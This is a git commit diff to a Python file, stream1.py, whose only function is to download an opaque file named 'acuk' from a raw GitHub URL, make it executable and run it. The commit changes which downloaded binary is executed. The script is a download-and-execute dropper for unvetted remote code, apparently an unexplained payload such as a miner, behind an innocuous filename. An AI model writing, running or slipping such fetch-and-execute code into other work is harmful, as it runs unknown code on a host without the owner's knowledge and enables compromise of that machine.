deb04a097e5d0acb440adb204281c9b103e0b8d8
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-01-01 11:13:41 +0700

    Update stream1.py

--- stream1.py
+++ stream1.py
@@ -2,4 +2,4 @@ import os
 import subprocess
 subprocess.run(['wget','https://raw.githubusercontent.com/aurbach55/toya/main/acuk'])
 subprocess.run(['chmod','+x','acuk'])
-subprocess.run(['./apel'])
+subprocess.run(['./acuk'])
